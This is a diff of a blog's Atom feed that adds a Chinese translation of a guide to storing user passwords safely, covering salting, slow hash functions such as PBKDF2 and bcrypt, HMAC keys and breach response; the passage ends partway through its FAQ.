@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://xdxd.love/"/>
-  <updated>2018-02-25T07:24:02.408Z</updated>
+  <updated>2018-02-26T06:46:36.221Z</updated>
   <id>http://xdxd.love/</id>
   
   <author>
@@ -14,6 +14,836 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>如何安全的存储用户的密码</title>
+    <link href="http://xdxd.love/2018/02/26/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E7%9A%84%E5%AD%98%E5%82%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81/"/>
+    <id>http://xdxd.love/2018/02/26/如何安全的存储用户的密码/</id>
+    <published>2018-02-26T06:28:59.000Z</published>
+    <updated>2018-02-26T06:46:36.221Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="更新：">更新：</h2><p>文章是14年翻译的，发在了freebuf和乌云drops上，最近重新看了一下，记录一下思考。总体来说感觉翻译的流畅度还是可以的，那会没有用谷歌翻译，记得翻译了一个星期，很是痛苦。文章比较长，所以顺便写个总结和微博上的一些评论的讨论。</p>
+<h2 id="总结：">总结：</h2><p>简单点说存储用户密码的安全最佳实践，使用随机盐拼接密码，用慢速hash函数做hash，基本就可以保证hash数据库泄露，被还原出明文的成本就很高了。如果需要更高的安全等级，可以考虑对hash数据再做一次加密，加密key独立存储。</p>
+<p>1，盐的长度要跟hash的长度对应，比如hash之后的结果是32byte，那么盐也要用32byte的随机数。<br>2，慢速hash可能带来一些性能问题，需要参数方便调整。</p>
+<h2 id="几个问题">几个问题</h2><p>1，如果数据库泄露，盐也会泄露，那么还是可以暴力破解明文密码。</p>
+<p>盐的作用是用来避免彩虹表攻击的。暴力破解和字典攻击是设计上无法避免，永远都会存在的攻击方式。使用恰当的hash函数和盐可以使得暴力破解成本高到无法接受，从而保证安全。</p>
+<p>2，关于隐匿安全 obsecurity。</p>
+<p>hash密码的方式是没有利用隐匿来保证安全的。这种存储方式的设计是完全可以公开的。目的是保证在算法公开，hash之后的数据公开的情况下，依然可以保护用户明文密码的安全。想到最近 安全圈怪现状的文章中提到的。这应该是一种正向防御的角度，而不是反反向的角度。关于隐匿安全我觉得应该是利用隐匿来实现安全是不可靠的。但是在安全设计之后，利用隐匿来增强安全也是一种防御手段。</p>
+<p>大多数的web开发者都会遇到设计用户账号系统的需求。账号系统最重要的一个方面就是如何保护用户的密码。一些大公司的用户数据库泄露事件也时有发生，所以我们必须采取一些措施来保护用户的密码，即使网站被攻破的情况下也不会造成较大的危害。如果你还在存储用户密码的MD5,那可真的有点弱了。赶紧来看看这篇文章吧。</p>
+<p>保护密码最好的的方式就是使用带盐的密码hash(salted password hashing).对密码进行hash操作是一件很简单的事情，但是很多人都犯了错。接下来我希望可以详细的阐述如何恰当的对密码进行hash，以及为什么要这样做。</p>
+<h2 id="重要提醒">重要提醒</h2><p>如果你打算自己写一段代码来进行密码hash，那么赶紧停下吧。这样太容易犯错了。这个提醒适用于每一个人，不要自己写密码的hash算法 ！关于保存密码的问题已经有了成熟的方案，那就是使用phpass或者本文提供的源码。</p>
+<h2 id="什么是hash">什么是hash</h2><pre><code>hash("hello") = 2cf24dba5fb<span class="number">0a30e26e83</span>b2ac<span class="number">5b9e29e1</span>b<span class="number">161e5c1</span>fa<span class="number">7425e73043</span><span class="number">362938b98</span>24
+hash("hbllo") = <span class="number">58756879c05</span>c68dfac<span class="number">9866712</span>fad<span class="number">6a93f8146</span>f337a69afe7dd<span class="number">238f33649463</span>66
+hash("waltz") = c<span class="number">0e81794384</span><span class="number">491161f1777</span>c232bc6bd9ec<span class="number">38f616560</span>b120fda<span class="number">8e90f38385</span>3542
+</code></pre><p>Hash算法是一种单向的函数。它可以把任意数量的数据转换成固定长度的“指纹”，这个过程是不可逆的。而且只要输入发生改变，哪怕只有一个bit，输出的hash值也会有很大不同。这种特性恰好合适用来用来保存密码。因为我们希望使用一种不可逆的算法来加密保存的密码，同时又需要在用户登陆的时候验证密码是否正确。</p>
+<p>在一个使用hash的账号系统中，用户注册和认证的大致流程如下：</p>
+<p>1, 用户创建自己的账号<br>2, 用户密码经过hash操作之后存储在数据库中。没有任何明文的密码存储在服务器的硬盘上。<br>3, 用户登陆的时候，将用户输入的密码进行hash操作后与数据库里保存的密码hash值进行对比。<br>4, 如果hash值完全一样，则认为用户输入的密码是正确的。否则就认为用户输入了无效的密码。<br>5, 每次用户尝试登陆的时候就重复步骤3和步骤4。<br>在步骤4的时候不要告诉用户是账号还是密码错了。只需要显示一个通用的提示，比如账号或密码不正确就可以了。这样可以防止攻击者枚举有效的用户名。</p>
+<p>还需要注意的是用来保护密码的hash函数跟数据结构课上见过的hash函数不完全一样。比如实现hash表的hash函数设计的目的是快速，但是不够安全。只有加密hash函数(cryptographic hash functions)可以用来进行密码的hash。这样的函数有SHA256, SHA512, RipeMD, WHIRLPOOL等。</p>
+<p>一个常见的观念就是密码经过hash之后存储就安全了。这显然是不正确的。有很多方式可以快速的从hash恢复明文的密码。还记得那些md5破解网站吧，只需要提交一个hash，不到一秒钟就能知道结果。显然，单纯的对密码进行hash还是远远达不到我们的安全需求。下一部分先讨论一下破解密码hash，获取明文常见的手段。</p>
+<h2 id="如何破解hash">如何破解hash</h2><p>字典和暴力破解攻击(Dictionary and Brute Force Attacks)<br>最常见的破解hash手段就是猜测密码。然后对每一个可能的密码进行hash，对比需要破解的hash和猜测的密码hash值，如果两个值一样，那么之前猜测的密码就是正确的密码明文。猜测密码攻击常用的方式就是字典攻击和暴力攻击。</p>
+<pre><code>Dictionary Attack
+
+Trying <span class="string">apple        :</span> failed
+Trying <span class="string">blueberry    :</span> failed
+Trying <span class="string">justinbeiber :</span> failed
+...
+Trying <span class="string">letmein      :</span> failed
+Trying <span class="string">s3cr3t       :</span> success!
+</code></pre><p>字典攻击是将常用的密码，单词，短语和其他可能用来做密码的字符串放到一个文件中，然后对文件中的每一个词进行hash，将这些hash与需要破解的密码hash比较。这种方式的成功率取决于密码字典的大小以及字典的是否合适。</p>
+<pre><code>Brute Force Attack
+
+Trying <span class="string">aaaa :</span> failed
+Trying <span class="string">aaab :</span> failed
+Trying <span class="string">aaac :</span> failed
+...
+Trying <span class="string">acdb :</span> failed
+Trying <span class="string">acdc :</span> success!
+</code></pre><p>暴力攻击就是对于给定的密码长度，尝试每一种可能的字符组合。这种方式需要花费大量的计算机时间。但是理论上只要时间足够，最后密码一定能够破解出来。只是如果密码太长，破解花费的时间就会大到无法承受。</p>
+<p>目前没有方式可以阻止字典攻击和暴力攻击。只能想办法让它们变的低效。如果你的密码hash系统设计的是安全的，那么破解hash唯一的方式就是进行字典或者暴力攻击了。</p>
+<h2 id="查表破解(Lookup_Tables)">查表破解(Lookup Tables)</h2><p>对于特定的hash类型，如果需要破解大量hash的话，查表是一种非常有效而且快速的方式。它的理念就是预先计算(pre-compute)出密码字典中每一个密码的hash。然后把hash和对应的密码保存在一个表里。一个设计良好的查询表结构，即使存储了数十亿个hash，每秒钟仍然可以查询成百上千个hash。</p>
+<p>如果你想感受下查表破解hash的话可以尝试一下在CraskStation上破解下下面的sha256 hash。</p>
+<pre><code>c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
+<span class="number">08</span>eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
+e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
+<span class="number">5206</span>b8b8a996cf5320cb12ca91c7b790fba9f030408efe83ebb83548dc3007bd
+反向查表破解(<span class="type">Reverse</span> <span class="type">Lookup</span> <span class="type">Tables</span>)
+<span class="type">Searching</span> <span class="keyword">for</span> hash(apple) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...     : <span class="type">Matches</span> [alice3, <span class="number">0</span>bob0, charles8]
+<span class="type">Searching</span> <span class="keyword">for</span> hash(blueberry) <span class="keyword">in</span> users' hash <span class="built_in">list</span>... : <span class="type">Matches</span> [usr10101, timmy, john91]
+<span class="type">Searching</span> <span class="keyword">for</span> hash(letmein) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...   : <span class="type">Matches</span> [wilson10, dragonslayerX, joe1984]
+<span class="type">Searching</span> <span class="keyword">for</span> hash(s3cr3t) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...    : <span class="type">Matches</span> [bruce19, knuth1337, john87]
+<span class="type">Searching</span> <span class="keyword">for</span> hash(z@<span class="number">29</span>hjja) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...  : <span class="type">No</span> users used this password
+</code></pre><p>这种方式可以让攻击者不预先计算一个查询表的情况下同时对大量hash进行字典和暴力破解攻击。</p>
+<p>首先，攻击者会根据获取到的数据库数据制作一个用户名和对应的hash表。然后将常见的字典密码进行hash之后，跟这个表的hash进行对比，就可以知道用哪些用户使用了这个密码。这种攻击方式很有效果，因为通常情况下很多用户都会有使用相同的密码。</p>
+<h2 id="彩虹表_(Rainbow_Tables)">彩虹表 (Rainbow Tables)</h2><p>彩虹表是一种使用空间换取时间的技术。跟查表破解很相似。只是它牺牲了一些破解时间来达到更小的存储空间的目的。因为彩虹表使用的存储空间更小，所以单位空间就可以存储更多的hash。彩虹表已经能够破解8位长度的任意md5hash。彩虹表具体的原理可以参考<a href="http://www.project-rainbowcrack.com/" target="_blank" rel="external">http://www.project-rainbowcrack.com/</a></p>
+<p>下一章节我们会讨论一种叫做“盐”(salting)的技术。通过这种技术可以让查表和彩虹表的方式无法破解hash。</p>
+<pre><code>加盐(Adding Salt)
+hash("hello")                    = 2cf24dba5fb<span class="number">0a30e26e83</span>b2ac<span class="number">5b9e29e1</span>b<span class="number">161e5c1</span>fa<span class="number">7425e73043</span><span class="number">362938b98</span>24
+hash("hello" + "QxLUF1bgIAdeQX") = <span class="number">9e209040c86</span><span class="number">3f84a31e71</span><span class="number">9795b25775</span><span class="number">23954739</span>fe5ed3b58a75cff<span class="number">2127075</span>ed1
+hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd<span class="number">420d50e26</span><span class="number">42992841d83</span><span class="number">38a314b8</span>ea<span class="number">157c9e18477</span>aaef226ab
+hash("hello" + "YYLmfY6IehjZMQ") = a<span class="number">49670c3c18</span>b<span class="number">9e079b9</span>cfaf<span class="number">51634f563</span>dc8ae3070db<span class="number">2c4a85443</span>05df<span class="number">1b60f007</span>
+</code></pre><p>查表和彩虹表的方式之所以有效是因为每一个密码的都是通过同样的方式来进行hash的。如果两个用户使用了同样的密码，那么一定他们的密码hash也一定相同。我们可以通过让每一个hash随机化，同一个密码hash两次，得到的不同的hash来避免这种攻击。</p>
+<p>具体的操作就是给密码加一个随即的前缀或者后缀，然后再进行hash。这个随即的后缀或者前缀成为“盐”。正如上面给出的例子一样，通过加盐，相同的密码每次hash都是完全不一样的字符串了。检查用户输入的密码是否正确的时候，我们也还需要这个盐，所以盐一般都是跟hash一起保存在数据库里，或者作为hash字符串的一部分。</p>
+<p>盐不需要保密，只要盐是随机的话，查表，彩虹表都会失效。因为攻击者无法事先知道盐是什么，也就没有办法预先计算出查询表和彩虹表。如果每个用户都是使用了不同的盐，那么反向查表攻击也没法成功。</p>
+<p>下一节，我们会介绍一些盐的常见的错误实现。</p>
+<h2 id="错误的方式：短的盐和盐的复用">错误的方式：短的盐和盐的复用</h2><p>最常见的错误实现就是一个盐在多个hash中使用或者使用的盐很短。</p>
+<h2 id="盐的复用(Salt_Reuse)">盐的复用(Salt Reuse)</h2><p>不管是将盐硬编码在程序里还是随机一次生成的，在每一个密码hash里使用相同的盐会使这种防御方法失效。因为相同的密码hash两次得到的结果还是相同的。攻击者就可以使用反向查表的方式进行字典和暴力攻击。只要在对字典中每一个密码进行hash之前加上这个固定的盐就可以了。如果是流行的程序的使用了硬编码的盐，那么也可能出现针对这种程序的这个盐的查询表和彩虹表，从而实现快速破解hash。</p>
+<p>用户每次创建或者修改密码一定要使用一个新的随机的盐</p>
+<h2 id="短的盐">短的盐</h2><p>如果盐的位数太短的话，攻击者也可以预先制作针对所有可能的盐的查询表。比如，3位ASCII字符的盐，一共有95x95x95 = 857,375种可能性。看起来好像很多。假如每一个盐制作一个1MB的包含常见密码的查询表，857,375个盐才是837GB。现在买个1TB的硬盘都只要几百块而已。</p>
+<p>基于同样的理由，千万不要用用户名做为盐。虽然对于每一个用户来说用户名可能是不同的，但是用户名是可预测的，并不是完全随机的。攻击者完全可以用常见的用户名作为盐来制作查询表和彩虹表破解hash。</p>
+<p>根据一些经验得出来的规则就是盐的大小要跟hash函数的输出一致。比如，SHA256的输出是256bits(32bytes),盐的长度也应该是32个字节的随机数据。</p>
+<h2 id="错误的方式：双重hash和古怪的hash函数">错误的方式：双重hash和古怪的hash函数</h2><p>这一节讨论另外一个常见的hash密码的误解:古怪的hash算法组合。人们可能解决的将不同的hash函数组合在一起用可以让数据更安全。但实际上，这种方式带来的效果很微小。反而可能带来一些互通性的问题，甚至有时候会让hash更加的不安全。本文一开始就提到过，永远不要尝试自己写hash算法，要使用专家们设计的标准算法。有些人会觉得通过使用多个hash函数可以降低计算hash的速度，从而增加破解的难度。通过减慢hash计算速度来防御攻击有更好的方法，这个下文会详细介绍。</p>
+<p>下面是一些网上找到的古怪的hash函数组合的样例。</p>
+<pre><code>md5<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">password</span>)</span>)</span>
+md5<span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">salt</span>)</span> + md5<span class="list">(<span class="keyword">password</span>)</span>)</span>
+sha1<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">password</span>)</span>)</span>
+sha1<span class="list">(<span class="keyword">str_rot13</span><span class="list">(<span class="keyword">password</span> + salt)</span>)</span>
+md5<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">password</span>)</span> + sha1<span class="list">(<span class="keyword">password</span>)</span>)</span> + md5<span class="list">(<span class="keyword">password</span>)</span>)</span>)</span>
+</code></pre><p>不要使用他们！</p>
+<p>注意：这部分的内容其实是存在争议的！我收到过大量邮件说组合hash函数是有意义的。因为如果攻击者不知道我们用了哪个函数，就不可能事先计算出彩虹表，并且组合hash函数需要更多的计算时间。</p>
+<p>攻击者如果不知道hash算法的话自然是无法破解hash的。但是考虑到Kerckhoffs’s principle,攻击者通常都是能够接触到源码的(尤其是免费软件和开源软件)。通过一些目标系统的密码–hash对应关系来逆向出算法也不是非常困难。</p>
+<p>如果你想使用一个标准的”古怪”的hash函数，比如HMAC，是可以的。但是如果你的目的是想减慢hash的计算速度，那么可以读一下后面讨论的慢速hash函数部分。基于上面讨论的因素，最好的做法是使用标准的经过严格测试的hash算法。</p>
+<h2 id="hash碰撞(Hash_Collisions)">hash碰撞(Hash Collisions)</h2><p>因为hash函数是将任意数量的数据映射成一个固定长度的字符串，所以一定存在不同的输入经过hash之后变成相同的字符串的情况。加密hash函数(Cryptographic hash function)在设计的时候希望使这种碰撞攻击实现起来成本难以置信的高。但时不时的就有密码学家发现快速实现hash碰撞的方法。最近的一个例子就是MD5，它的碰撞攻击已经实现了。</p>
+<p>碰撞攻击是找到另外一个跟原密码不一样，但是具有相同hash的字符串。但是，即使在相对弱的hash算法，比如MD5,要实现碰撞攻击也需要大量的算力(computing power),所以在实际使用中偶然出现hash碰撞的情况几乎不太可能。一个使用加盐MD5的密码hash在实际使用中跟使用其他算法比如SHA256一样安全。不过如果可以的话，使用更安全的hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL等是更好的选择。</p>
+<p>正确的方式：如何恰当的进行hash<br>这部分会详细讨论如何恰当的进行密码hash。第一个章节是最基础的，这章节的内容是必须的。后面一个章节是阐述如何继续增强安全性，让hash破解变得异常困难。</p>
+<h2 id="基础：使用加盐hash">基础：使用加盐hash</h2><p>我们已经知道恶意黑客可以通过查表和彩虹表的方式快速的获得hash对应的明文密码，我们也知道了通过使用随机的盐可以解决这个问题。但是我们怎么生成盐，怎么在hash的过程中使用盐呢？</p>
+<p>盐要使用密码学上可靠安全的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator (CSPRNG))来产生。CSPRNG跟普通的伪随机数生成器比如C语言中的rand(),有很大不同。正如它的名字说明的那样，CSPRNG提供一个高标准的随机数，是完全无法预测的。我们不希望我们的盐能够被预测到，所以一定要使用CSPRNG。下表提供了一些常用语言中的CSPRNG。</p>
+<pre><code>Platform    CSPRNG
+PHP    mcrypt_create_iv, openssl_random_pseudo_bytes
+Java    java<span class="class">.security</span><span class="class">.SecureRandom</span>
+Dot NET (C#, VB)    System<span class="class">.Security</span><span class="class">.Cryptography</span><span class="class">.RNGCryptoServiceProvider</span>
+Ruby    SecureRandom
+Python    os<span class="class">.urandom</span>
+Perl    Math::Random::Secure
+C/C++ (Windows API)    CryptGenRandom
+Any language on GNU/Linux or Unix    Read from /dev/random or /dev/urandom
+</code></pre><p>每一个用户，每一个密码都要使用不同的盐。用户每次创建账户或者修改密码都要使用一个新的随机盐。永远不要重复使用盐。盐的长度要足够，一个经验规则就是盐的至少要跟hash函数输出的长度一致。盐应该跟hash一起存储在用户信息表里。</p>
+<p>存储一个密码：</p>
+<p>1, 使用CSPRNG生成一个长的随机盐。 </p>
+<p>2, 将密码和盐拼接在一起，使用标准的加密hash函数比如SHA256进行hash </p>
+<p>3, 将盐和hash记录在用户数据库中</p>
+<p>验证一个密码：</p>
+<p>1, 从数据库中取出用户的盐和hash </p>
+<p>2, 将用户输入的密码和盐按相同方式拼接在一起，使用相同的hash函数进行hash </p>
+<p>3, 比较计算出的hash跟存储的hash是否相同。如果相同则密码正确。反之则密码错误。</p>
+<p>在本文的最后，给出了php,C#,Java,Ruby的加盐密码hash的实现代码。</p>
+<h2 id="在web应用中，要在服务端进行hash：">在web应用中，要在服务端进行hash：</h2><p>如果你在写一个web应用，可能会有在客户端还是服务端进行hash的疑惑。是将密码在浏览器里使用javascript进行hash，还是将明文传给服务端，在服务端进行hash呢？</p>
+<p>即使在客户端用javascript进行了hash，在服务端依然需要将得到的密码hash再进行hash。如果不这么做的话，认证用户的时候，服务端是获取了浏览器传过来的hash跟数据库里的hash比较。这样子看起来是更安全了，因为没有明文密码传送到服务端。但是事实上却不是这样。</p>
+<p>问题在于这样的话，如果恶意的黑客获取了用户的hash，就可以直接用来登陆用户的账号了。甚至都不需要知道用户的明文密码！也就不需要破解hash了。</p>
+<p>这并不是说你完全不能在浏览器端进行hash。只是如果你要这样做的话，一定要在服务端再hash一次。在浏览器端进行hash是一个不错的想法，但是在实现的时候一定要考虑到以下几点：</p>
+<p>1, 客户端密码hash并不是HTTPS(SSL/TLS)的替代品。如果浏览器和服务器之间的连接是不安全的，中间人(man-in-the-middle)可能通过修改网页的加载的javascript移除掉hash函数来得到用户的明文密码。</p>
+<p>2, 有些浏览器可能不支持javascript，有些用户也会禁用javascript。为了更好的兼容性，需要检测用户的浏览器是否支持javascript，如果不支持的话就需要在服务端模拟客户端hash的逻辑。</p>
+<p>3, 客户端的hash也需要加盐。一个很容想到的方式就是使用客户端脚本请求服务器或得用户的盐。记住，不要使用这种方式。因为这样恶意攻击者就可以通过这个逻辑来判断一个用户名是否有效。因为我们已经在服务端进行了恰当的加盐的hash。所以这里使用用户名跟特定的字符串(比如域名)拼接作为客户端的盐是可以的。</p>
+<h2 id="使用慢速hash函数让破解更加困难:">使用慢速hash函数让破解更加困难:</h2><p>加盐可以让攻击者无法使用查表和彩虹表的方式对大量hash进行破解。但是依然无法避免对单个hash的字典和暴力攻击。高端的显卡(GPUs)和一些定制的硬件每秒可以计算数十亿的hash，所以针对单个hash的攻击依然有效。为了避免字典和暴力攻击，我们可以采用一种称为key扩展(key stretching)的技术。</p>
+<p>思路就是让hash的过程便得非常缓慢，即使使用高速GPU和特定的硬件，字典和暴力破解的速度也慢到没有实用价值。通过减慢hash的过程来防御攻击，但是hash速度依然可以保证用户使用的时候没有明显的延迟。</p>
+<p>key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去使用自己创造的迭代hash函数，那是不够的。要使用标准算法的hash函数，比如PBKDF2或者bcrypt。PHP实现可以在这里找到。</p>
+<p>这些算法采用了一个安全变量或者迭代次数作为参数。这个值决定了hash的过程具体有多慢。对于桌面软件和手机APP，确定这个参数的最好方式是在设备上运行一个标准测试程序得到hash时间大概在半秒左右的值。这样就可以避免暴力攻击，也不会影响用户体验。</p>
+<p>如果是在web应用中使用key扩展hash函数，需要考虑可能有大量的计算资源用来处理用户认证请求。攻击者可能通过这种方式来进行拒绝服务攻击。不过我依然推荐使用key扩展hash函数，只是迭代次数设置的小一点。这个次数需要根据自己服务器的计算能力和预计每秒需要处理的认证请求次数来设置。对于拒绝服务攻击可以通过让用户登陆的时候输入验证码的方式来防御。系统设计的时候一定要考虑到这个迭代次数将来可以方便的增加或降低。</p>
+<p>如果你担心计算机的能力不够强，而又希望在自己的web应用中使用key扩展hash函数，可以考虑在用户的浏览器运行hash函数。Stanford JavaScript Crypto Library包含了PBKDF2算法。在浏览器中进行hash需要考虑上面提到的几个方面。</p>
+<p>理论上不可能破解的hash：使用加密的key和密码hash硬件</p>
+<p>只要攻击者能够验证一个猜测的密码是正确还是错误，他们都可以使用字典或者暴力攻击破解hash。更深度的防御方法是加入一个保密的key(secret key)进行hash，这样只有知道这个key的人才能验证密码是否正确。这个可以通过两种方式来实现。一种是hash通过加密算法加密比如AES，或者使用基于key的hash函数(HMAC)。</p>
+<p>这个实现起来并不容易。key一定要做到保密，即使系统被攻破也不能泄露才行。但是如果攻击者获取了系统权限，无论key保存在哪里，都可能被获取到。所以这个key一定要保存在一个外部系统中，比如专门用来进行密码验证的物理隔离的服务器。或是使用安装在服务器上特殊硬件，比如YubiHSM。</p>
+<p>强烈建议所有大型的服务(超过10万用户)的公司使用这种方式。对于超过100万用户的服务商一定得采用这种方式保护用户信息。</p>
+<p>如果条件不允许使用专用验证的服务器和特殊的硬件，依然从这种方式中受益。大部分数据库泄露都是利用了SQL注入技术。sql注入大部分情况下，攻击者都没法读取服务器上的任意文件(关闭数据库服务器的文件权限)。如果你生成了一个随机的key，把它保存在了一个文件里。并且密码使用了加密key的加盐hash，单单sql注入攻击导致的hash泄露并不会影响用户的密码。虽然这种方式不如使用独立的系统来保存key安全，因为如果系统存在文件包含漏洞的话，攻击者就可能读取这个秘密文件了。不过，使用了加密key总归好过没有使用吧。</p>
+<p>需要注意使用key的hash并不是不需要加盐，聪明的攻击者总是会找到办法获取到key的。所以让hash在盐和key扩展的保护下非常重要。</p>
+<h2 id="其他的安全措施">其他的安全措施</h2><p>密码hash仅仅是在发生安全事故的时候保护密码。它并不能让应用程序更加安全。对于保护用户密码hash更多的是需要保护密码hash不被偷走。</p>
+<p>即使经验丰富的程序也需要经过安全培训才能写出安全的应用。一个不错的学习web应用漏洞的资源是OWASP。除非你理解了OWASP Top Ten Vulnerability List,否则不要去写关系到敏感数据的程序。公司有责任确保所有的开发者都经过了足够的安全开发的培训。</p>
+<p>通过第三方的渗透测试也是不错的方式。即使最好的程序员也会犯错，所以让安全专家来审计代码总是有意义的。寻找一个可信赖的第三方或者自己招聘一个安全人员来机型定期的代码审计。安全评审要在应用生命周期的早期就开始并且贯穿整个开发过程。</p>
+<p>对网站进行入侵监控也十分重要。我建议至少招聘一名全职的安全人员进行入侵检测和安全事件响应。如果入侵没有检测到，攻击者可能让在你的网站上挂马影响你的用户。所以迅速的入侵检测和响应也很重要。</p>
+<h2 id="经常提问的问题">经常提问的问题</h2><p>我应该使用什么hash算法</p>
+<p>可以使用</p>
+<p>1, 本文最后介绍的代码 </p>
+<p>2, OpenWall的Portable PHP password hashing framework </p>
+<p>3, 经过充分测试的加密hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL, SHA3等 </p>
+<p>4, 设计良好的key扩展hash算法，比如PBKDF2，bcrypt，scrypt </p>
+<p>5, crypt#Library_Function_crypt.283.29)的安全版本。($2y$, $5$, $6$)</p>
+<p>不要使用</p>
+<p>1, 过时的hash函数，比如MD5,SHA1 </p>
+<p>2， crypt的不安全版本。($1$, $2$, $2x$, $3$) </p>
+<p>3, 任何自己设计的算法。</p>
+<p>尽管MD5和SHA1并没有密码学方面的攻击导致它们生成的hash很容易被破解，但是它们年代很古老了，通常都认为(可能有一些不恰当)它们不合适用来进行密码的存储。所以我不推荐使用它们。对于这个规则有个例外就是PBKDF2,它使用SHA1作为它的基础算法。</p>
+<p>当用户忘记密码的时候我应该怎样让他们重置</p>
+<p>在我个人看来现在外面广泛使用的密码重置机制都是不安全的，如果你有很高的安全需求，比如重要的加密服务，那么不要让用户重置他们的密码。</p>
+<p>大多数网站使用绑定的email来进行密码找回。通过生成一个随机的只使用一次的token，这个token必须跟账户绑定，然后把密码重置的链接发送到用户邮箱中。当用户点击密码重置链接的时候，提示他们输入新的密码。需要注意token一定要绑定到用户以免攻击者使用发送给自己的token来修改别人的密码。</p>
+<p>token一定要设置成15分钟后或者使用一次后作废。当用户登陆或者请求了一个新的token的时候，之前发送的token都作废也是不错的主意。如果token不失效的话，那么就可以用来永久控制这个账户了。Email(SMTP)是明文传输的协议，而互联网上可能有很多恶意的路由器记录email流量。并且用户的email账号也可能被盗。使token尽可能快的失效可以降低上面提到的这些风险。</p>
+<p>用户可能尝试去修改token，所以不要在token里存储任何账户信息。token应该是一个不能被预测的随机的二进制块(binary blob)，仅仅用来进行识别的一条记录。</p>
+<p>永远不要通过email发送用户的新密码。记得用户重置密码的时候要重新生成盐，不要使用之前旧密码使用的盐。</p>
+<p>如果我的用户数据库泄露了，我应该怎么办</p>
+<p>第一要做的就是弄明白信息是怎么泄露的，然后把漏洞修补好。</p>
+<p>人们可能会想办法掩盖这次安全事件，希望没有人知道。但是，尝试掩盖安全事件会让你的处境变得更糟。因为你不告知你的用户他的信息和密码可能泄露了会给用户带来更大的风险。一定要第一时间通知用户发生了安全事件，即使你还没有完全搞明白黑客到底渗透到了什么程度。在首页上放一个提醒，然后链接到详细说明的页面。如果可能的话给每一个用户发送email提醒。</p>
+<p>向你的用户详细的说明他的密码是如何被保护的，希望是加盐的hash，即使密码进行了加盐hash保护，攻击者依然会进行字典和暴力攻击尝试破解hash。攻击者会使用发现的密码尝试登陆其他网站，因为用户可能在不同的网站都使用了相同的密码(所谓的撞库攻击)。告知你的用户存在的这些风险，建议他们修改使用了相同密码的地方。在自己的网站上，下次用户登陆的时候强制他们修改密码。大部分用户可能会尝试使用相同的密码，为了方便。要设计足够的逻辑避免这样的情况发生。</p>
+<p>即使有了加盐的hash，攻击者也可能快速破解一些很弱的弱密码。为了降低这种风险，可以在使用正确密码的前提下，加一个邮件认证，直到用户修改密码。</p>
+<p>还要告知你的用户有哪些个人信息存储在网站上。如果数据库包含信用卡信息，你需要通知你的用户注意自己近期的账单，并且最好注销掉这个信用卡。</p>
+<p>应该使用怎样的密码策略，需要强制使用强密码么</p>
+<p>如果你的服务不是有很严格的安全需求，那么不要限制你的用户。我建议在用户输入密码的时候显示它的强度等级。让用户自己决定使用什么强度的密码。如果你的系统有很强的安全需求，那么强制用户使用12位以上的密码，至少包含2个数字，2个字母，2个字符。</p>
+<p>每6个月最多强制用户修改一次密码。超过这个次数，用户就会感到疲劳。他们更倾向于选择一个弱密码。更应该做的是教育你的用户，当他们感到自己的密码可能泄露的时候主动修改密码。</p>
+<p>如果攻击者获取了数据库权限，他不能直接替换hash登陆任意账户么</p>
+<p>当然，不过如果他已经或得了数据库权限，很可能已经可以获得服务器上的所有信息了。所以没有什么必要去修改hash登陆别人账户。进行密码hash的目的不是保护网站不被入侵，而是如果入侵发生了，可以更好的保护用户的密码。</p>
+<p>在SQL注入攻击中，保护hash不被替换的方式使用两个用户不同权限的用户连接数据库。一个具有写权限，另外一个只具有只读的权限。</p>
+<p>为什么需要一些特别的算法比如HMAC，而不是直接把密码和加密key拼接在一起</p>
+<p>(这部分讲一些密码学的原理，翻译的不好请见谅)</p>
+<p>hash函数，比如MD5,SHA1,SHA2使用了Merkle–Damgård construction，这导致算法可能长度扩展攻击(length extension attacks)。意思就是说给定一个hash H(X)，攻击者可以在不知道X的情况下，可以找到一个H(pad(X)+Y)的值，Y是个其他的字符串。pad(X)是hash函数使用的填充函数(padding function)。</p>
+<p>这就意味者，对于hash H(key + message)，攻击者可以计算 H(pad(key + message) + extension)，并不需要知道加密key。如果这个hash是用在消息认证过程中，使用key为了避免消息被修改。这样的话这个系统就可能失效了，因为攻击者掌握了一个有效的基于 message+extension的hash。</p>
+<p>这种攻击对于如何快速破解hash还不是很清楚。但是，基于一些风险的考虑，不建议使用单纯的hash函数进行加密key的hash。也许一个聪明的密码学家一天就可以找到使用这种攻击快速破解hash的方法。所以记得使用HMAC。</p>
+<p>盐应该拼在密码的前面还是后面</p>
+<p>这个不重要。选择一个并且保持风格一致就行了。实际中，把盐放在前面更常见一点。</p>
+<p>为什么本文最后提供的hash代码使用了固定执行时间的函数来比较hash(length-constant)</p>
+<p>使用固定的时间来比较hash是为了防止攻击者在线上的系统中使用基于时间差的攻击。这样攻击者就只能线下破解了。</p>
+<p>比较两个字符串是否相同，标准的方式是先比较第一个字节，然后比较第二个字节，一次类推。只要发现有一个字节不同，那么这两个字符串就是不同了。可以返回false的消息了。如果所有字节比较下来都一样，那么这两个字符串就是相同的，可以返回true。这就意味了比较两个字符串，如果他们相同的长度不一样，花费的时间不一样。开始部分相同的长度越长，花费的时间也就越长。</p>
